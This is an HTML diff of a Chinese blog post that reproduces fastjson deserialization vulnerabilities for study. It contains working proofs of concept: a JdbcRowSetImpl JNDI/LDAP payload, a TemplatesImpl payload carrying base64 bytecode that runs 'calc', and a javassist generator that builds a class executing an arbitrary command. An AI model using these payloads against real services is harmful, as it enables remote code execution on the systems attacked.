data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710732664111-0b27aa88-1dc4-4dcf-9e1f-9ec53ff402d4.png#averageHue=%23363d47&clientId=uc6fd9fb4-b99e-4&from=paste&height=498&id=uf764e4ab&originHeight=821&originWidth=1942&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=679185&status=done&style=none&taskId=u99025488-aa7d-42ad-89b7-b760c12afd1&title=&width=1176.9696289426845" referrerpolicy="no-referrer" alt="image.png"><br>漏洞触发点也就是在这，后续的漏洞利用不太能跟进到这，还是 ASM 解析器的原因，我们没办法跟进到具体内容</p>
 <h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p>稍微回忆一下流程，主要集中于DefaultJSONParser 中的获取解析器和 deserialze 解析，JSON 数据经过处理</p>
 <h3 id="1x01-JdbcRowSetImpl-利用"><a href="#1x01-JdbcRowSetImpl-利用" class="headerlink" title="1x01  JdbcRowSetImpl 利用"></a>1x01  JdbcRowSetImpl 利用</h3><p>主要问题出在<code>JdbcRowSetImpl#setDataSourceName</code>和<code>JdbcRowSetImpl#setAutoCommit</code>方法中存在可控的参数以及有后续调用的可能<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710416903707-98080cd8-afc4-4bba-8900-8e1fbe70c364.png#averageHue=%233b3d3f&clientId=uc4b17eff-485b-4&from=paste&height=349&id=u875c7aa6&originHeight=524&originWidth=1121&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=221746&status=done&style=none&taskId=u1a08b5af-f0a8-44ae-8a20-149f94b4f16&title=&width=747.3333333333334" referrerpolicy="no-referrer" alt="image.png"><br>这里能够对 dataSource 变量自由赋值<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710416969481-9d74a99e-8c3c-4ba7-9f81-29a0e366a445.png#averageHue=%233c403f&clientId=uc4b17eff-485b-4&from=paste&height=271&id=ua52d0d7f&originHeight=406&originWidth=1039&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=161258&status=done&style=none&taskId=u20a841f1-cf91-47f6-bc2b-c3e19e22f14&title=&width=692.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>然后在 connect 方法中我们找到了熟悉的 lookup，再看一眼它前面的调用，居然是 initialContext，并且 lookup 中的参数也是我们刚才的可以通过 set 方法去自己构造 datasource，三种条件结合起来就存在 JNDI 攻击的可能<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710416977008-81a76719-b42f-429c-bece-8237cf112339.png#averageHue=%233c3e3f&clientId=uc4b17eff-485b-4&from=paste&height=291&id=u8fa763be&originHeight=436&originWidth=1608&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=269661&status=done&style=none&taskId=udc5b008a-6e39-4a7f-940d-db286e6bc49&title=&width=1072" referrerpolicy="no-referrer" alt="image.png"></p>
-<pre><code class="java">import com.alibaba.fastjson.JSON;
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>
 
 
 
-public class FastJson_JNDI_LDAP &#123;
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FastJson_JNDI_LDAP</span> <span class="token punctuation">&#123;</span>
 
-    public static void main(String[] args) &#123;
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
 
-        String payload = &quot;&#123;&quot; +
+        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token string">"&#123;"</span> <span class="token operator">+</span>
 
-                &quot;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,&quot; +
+                <span class="token string">"\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","</span> <span class="token operator">+</span>
 
-                &quot;\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1099/badClassName\&quot;, &quot; +
+                <span class="token string">"\"dataSourceName\":\"ldap://127.0.0.1:1099/badClassName\", "</span> <span class="token operator">+</span>
 
-                &quot;\&quot;autoCommit\&quot;:true&quot; +
+                <span class="token string">"\"autoCommit\":true"</span> <span class="token operator">+</span>
 
-                &quot;&#125;&quot;;
+                <span class="token string">"&#125;"</span><span class="token punctuation">;</span>
 
-        JSON.parse(payload);
+        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-    &#125;
+    <span class="token punctuation">&#125;</span>
 
-&#125;
-</code></pre>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>测试一下<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710417168100-c7572f76-9fcf-4344-b30d-4d3697e3357d.png#averageHue=%2354595b&clientId=uc4b17eff-485b-4&from=paste&height=653&id=ua773a7e3&originHeight=979&originWidth=2402&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=642359&status=done&style=none&taskId=uc6cf5d54-f3b5-4e18-8563-fb0fe09d0ef&title=&width=1601.3333333333333" referrerpolicy="no-referrer" alt="image.png"><br>具体的流程分析无法，跟进上面工作流程中我们讲到了 getOnly 的问题，由于我们不能够控制 JdbcRowSetImpl 中具体方法内容，也就无法使得 getOnly 参数为 false，不开启 ASM 解析器<br>所以无法调试，但其实 deserialize 的内容是差不多的，for 循环获取到 fieldInfo 数组的内容，然后读取到 set 方法反射调用<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710742537389-b6db61d9-19a7-4893-873c-67165aed53ad.png#averageHue=%233b414b&clientId=ue1f0f42a-3850-4&from=paste&height=630&id=u019fb7f4&originHeight=1040&originWidth=2560&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=1026123&status=done&style=none&taskId=uc3fbbfe4-be11-4b33-a01e-26dade847d9&title=&width=1551.515061839996" referrerpolicy="no-referrer" alt="image.png"></p>
 <h3 id="1x02-TemplateImpl-利用"><a href="#1x02-TemplateImpl-利用" class="headerlink" title="1x02 TemplateImpl 利用"></a>1x02 TemplateImpl 利用</h3><p>先看利用 POC 吧</p>
-<pre><code class="java">import com.alibaba.fastjson.JSON;
-import com.alibaba.fastjson.parser.Feature;
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">Feature</span></span><span class="token punctuation">;</span>
 
 
-public class FastJson_JNDI_LDAP &#123;
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FastJson_JNDI_LDAP</span> <span class="token punctuation">&#123;</span>
 
-    public static void main(String[] args) &#123;
-        getShortpayload getShortpayload=new getShortpayload();
-        String shortpayload=getShortpayload.getShortTemplatesImpl(&quot;calc&quot;);
-        System.out.println(shortpayload);
-        String payload=&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;, \&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQAHwEABEV2aWwHAAEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwADAQAIPGNsaW5pdD4BAAMoKVYBAARDb2RlAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcACAEADVN0YWNrTWFwVGFibGUBABFqYXZhL2xhbmcvUnVudGltZQcACwEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAA0ADgoADAAPAQAEY2FsYwgAEQEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABMAFAoADAAVAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgwAGgAGCgAEABsBAApTb3VyY2VGaWxlAQAJRXZpbC5qYXZhACEAAgAEAAAAAAAEAAgABQAGAAEABwAAADIAAgABAAAAEbgAEBIStgAWV6cAB0unAAOxAAEAAAAJAAwACQABAAoAAAAHAAJMBwAJAwABABcAGAABAAcAAAANAAAAAwAAAAGxAAAAAAABABcAGQABAAcAAAANAAAABAAAAAGxAAAAAAABABoABgABAAcAAAARAAEAAQAAAAUqtwAcsQAAAAAAAQAdAAAAAgAe\&quot;], &#39;_name&#39;:&#39;c.c&#39;, &#39;_tfactory&#39;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123;&#125;, \&quot;_name\&quot;:\&quot;a\&quot;, \&quot;_version\&quot;:\&quot;1.0\&quot;, \&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;&quot;;
-        JSON.parseObject(payload, Feature.SupportNonPublicField);
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        getShortpayload getShortpayload<span class="token operator">=</span><span class="token keyword">new</span> <span class="token function">getShortpayload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">String</span> shortpayload<span class="token operator">=</span>getShortpayload<span class="token punctuation">.</span><span class="token function">getShortTemplatesImpl</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>shortpayload<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">String</span> payload<span class="token operator">=</span><span class="token string">"&#123;\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\":[\"yv66vgAAADQAHwEABEV2aWwHAAEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwADAQAIPGNsaW5pdD4BAAMoKVYBAARDb2RlAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcACAEADVN0YWNrTWFwVGFibGUBABFqYXZhL2xhbmcvUnVudGltZQcACwEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAA0ADgoADAAPAQAEY2FsYwgAEQEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABMAFAoADAAVAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgwAGgAGCgAEABsBAApTb3VyY2VGaWxlAQAJRXZpbC5qYXZhACEAAgAEAAAAAAAEAAgABQAGAAEABwAAADIAAgABAAAAEbgAEBIStgAWV6cAB0unAAOxAAEAAAAJAAwACQABAAoAAAAHAAJMBwAJAwABABcAGAABAAcAAAANAAAAAwAAAAGxAAAAAAABABcAGQABAAcAAAANAAAABAAAAAGxAAAAAAABABoABgABAAcAAAARAAEAAQAAAAUqtwAcsQAAAAAAAQAdAAAAAgAe\"], '_name':'c.c', '_tfactory':&#123; &#125;,\"_outputProperties\":&#123;&#125;, \"_name\":\"a\", \"_version\":\"1.0\", \"allowedProtocols\":\"all\"&#125;"</span><span class="token punctuation">;</span>
+        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token class-name">Feature<span class="token punctuation">.</span>SupportNonPublicField</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-    &#125;
+    <span class="token punctuation">&#125;</span>
 
-&#125;
-</code></pre>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>具体恶意类的内容，也就是 CC3 中恶意类一样,只不过这里我们用 javassist 写一下</p>
-<pre><code class="java">import javassist.*;
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
 
-import java.util.Base64;
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span>
 
-public class getShortpayload &#123;
-    Base64.Encoder encoder=Base64.getEncoder();
-    public  String getShortTemplatesImpl(String cmd) &#123;
-        try &#123;
-            ClassPool pool = ClassPool.getDefault();
-            CtClass ctClass = pool.makeClass(&quot;Evil&quot;);
-            CtClass superClass = pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);
-            ctClass.setSuperclass(superClass);
-            CtConstructor constructor = ctClass.makeClassInitializer();
-            constructor.setBody(&quot;        try &#123;\n&quot; +
-                    &quot;            Runtime.getRuntime().exec(\&quot;&quot; + cmd + &quot;\&quot;);\n&quot; +
-                    &quot;        &#125; catch (Exception ignored) &#123;\n&quot; +
-                    &quot;        &#125;&quot;);
-            CtMethod ctMethod1 = CtMethod.make(&quot;    public void transform(&quot; +
-                    &quot;com.sun.org.apache.xalan.internal.xsltc.DOM document, &quot; +
-                    &quot;com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) &#123;\n&quot; +
-                    &quot;    &#125;&quot;, ctClass);
-            ctClass.addMethod(ctMethod1);
-            CtMethod ctMethod2 = CtMethod.make(&quot;    public void transform(&quot; +
-                    &quot;com.sun.org.apache.xalan.internal.xsltc.DOM document, &quot; +
-                    &quot;com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, &quot; +
-                    &quot;com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) &#123;\n&quot; +
-                    &quot;    &#125;&quot;, ctClass);
-            ctClass.addMethod(ctMethod2);
-            byte[] bytes = ctClass.toBytecode();
-            ctClass.defrost();
-            String payload=encoder.encodeToString(bytes);
-            return payload;
-        &#125; catch (Exception e) &#123;
-            e.printStackTrace();
-            return null;
-        &#125;
-    &#125;
-&#125;
-</code></pre>
+<span class="token keyword">public</span> <span class="token keyword">class</span> getShortpayload <span class="token punctuation">&#123;</span>
+    <span class="token class-name">Base64<span class="token punctuation">.</span>Encoder</span> encoder<span class="token operator">=</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span>  <span class="token class-name">String</span> <span class="token function">getShortTemplatesImpl</span><span class="token punctuation">(</span><span class="token class-name">String</span> cmd<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+            <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"Evil"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">CtClass</span> superClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            ctClass<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>superClass<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">CtConstructor</span> constructor <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            constructor<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token string">"        try &#123;\n"</span> <span class="token operator">+</span>
+                    <span class="token string">"            Runtime.getRuntime().exec(\""</span> <span class="token operator">+</span> cmd <span class="token operator">+</span> <span class="token string">"\");\n"</span> <span class="token operator">+</span>
+                    <span class="token string">"        &#125; catch (Exception ignored) &#123;\n"</span> <span class="token operator">+</span>
+                    <span class="token string">"        &#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">CtMethod</span> ctMethod1 <span class="token operator">=</span> <span class="token class-name">CtMethod</span><span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span><span class="token string">"    public void transform("</span> <span class="token operator">+</span>
+                    <span class="token string">"com.sun.org.apache.xalan.internal.xsltc.DOM document, "</span> <span class="token operator">+</span>
+                    <span class="token string">"com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) &#123;\n"</span> <span class="token operator">+</span>
+                    <span class="token string">"    &#125;"</span><span class="token punctuation">,</span> ctClass<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            ctClass<span class="token punctuation">.</span><span class="token function">addMethod</span><span class="token punctuation">(</span>ctMethod1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">CtMethod</span> ctMethod2 <span class="token operator">=</span> <span class="token class-name">CtMethod</span><span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span><span class="token string">"    public void transform("</span> <span class="token operator">+</span>
+                    <span class="token string">"com.sun.org.apache.xalan.internal.xsltc.DOM document, "</span> <span class="token operator">+</span>
+                    <span class="token string">"com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, "</span> <span class="token operator">+</span>
+                    <span class="token string">"com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) &#123;\n"</span> <span class="token operator">+</span>
+                    <span class="token string">"    &#125;"</span><span class="token punctuation">,</span> ctClass<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            ctClass<span class="token punctuation">.</span><span class="token function">addMethod</span><span class="token punctuation">(</span>ctMethod2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            ctClass<span class="token punctuation">.</span><span class="token function">defrost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token class-name">String</span> payload<span class="token operator">=</span>encoder<span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> payload<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h4 id="2x01-流程简单分析"><a href="#2x01-流程简单分析" class="headerlink" title="2x01  流程简单分析"></a>2x01  流程简单分析</h4><p>fastjson 解析部分不赘述，来分析TemplateImpl 部分</p>
-<pre><code class="java">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">&#123;</span><span class="token string">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">,</span>
 
- &quot;_bytecodes&quot;:[&quot;yv66vgAAADQAHwEABEV2aWwHAAEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwADAQAIPGNsaW5pdD4BAAMoKVYBAARDb2RlAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcACAEADVN0YWNrTWFwVGFibGUBABFqYXZhL2xhbmcvUnVudGltZQcACwEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAA0ADgoADAAPAQAEY2FsYwgAEQEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABMAFAoADAAVAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgwAGgAGCgAEABsBAApTb3VyY2VGaWxlAQAJRXZpbC5qYXZhACEAAgAEAAAAAAAEAAgABQAGAAEABwAAADIAAgABAAAAEbgAEBIStgAWV6cAB0unAAOxAAEAAAAJAAwACQABAAoAAAAHAAJMBwAJAwABABcAGAABAAcAAAANAAAAAwAAAAGxAAAAAAABABcAGQABAAcAAAANAAAABAAAAAGxAAAAAAABABoABgABAAcAAAARAAEAAQAAAAUqtwAcsQAAAAAAAQAdAAAAAgAe&quot;],
+ <span class="token string">"_bytecodes"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"yv66vgAAADQAHwEABEV2aWwHAAEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwADAQAIPGNsaW5pdD4BAAMoKVYBAARDb2RlAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcACAEADVN0YWNrTWFwVGFibGUBABFqYXZhL2xhbmcvUnVudGltZQcACwEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAA0ADgoADAAPAQAEY2FsYwgAEQEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABMAFAoADAAVAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgwAGgAGCgAEABsBAApTb3VyY2VGaWxlAQAJRXZpbC5qYXZhACEAAgAEAAAAAAAEAAgABQAGAAEABwAAADIAAgABAAAAEbgAEBIStgAWV6cAB0unAAOxAAEAAAAJAAwACQABAAoAAAAHAAJMBwAJAwABABcAGAABAAcAAAANAAAAAwAAAAGxAAAAAAABABcAGQABAAcAAAANAAAABAAAAAGxAAAAAAABABoABgABAAcAAAARAAEAAQAAAAUqtwAcsQAAAAAAAQAdAAAAAgAe"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
 
- &#39;_name&#39;:&#39;c.c&#39;, 
- &#39;_tfactory&#39;:&#123; &#125;,
- &quot;_outputProperties&quot;:&#123;&#125;,
- &quot;_name&quot;:&quot;a&quot;,
+ <span class="token char">'_name'</span><span class="token operator">:</span><span class="token char">'c.c'</span><span class="token punctuation">,</span> 
+ '_tfactory'<span class="token operator">:</span><span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+ <span class="token string">"_outputProperties"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+ <span class="token string">"_name"</span><span class="token operator">:</span><span class="token string">"a"</span><span class="token punctuation">,</span>
  
- &quot;_version&quot;:&quot;1.0&quot;, 
+ <span class="token string">"_version"</span><span class="token operator">:</span><span class="token string">"1.0"</span><span class="token punctuation">,</span> 
  
- &quot;allowedProtocols&quot;:&quot;all&quot;&#125;
-</code></pre>
+ <span class="token string">"allowedProtocols"</span><span class="token operator">:</span><span class="token string">"all"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
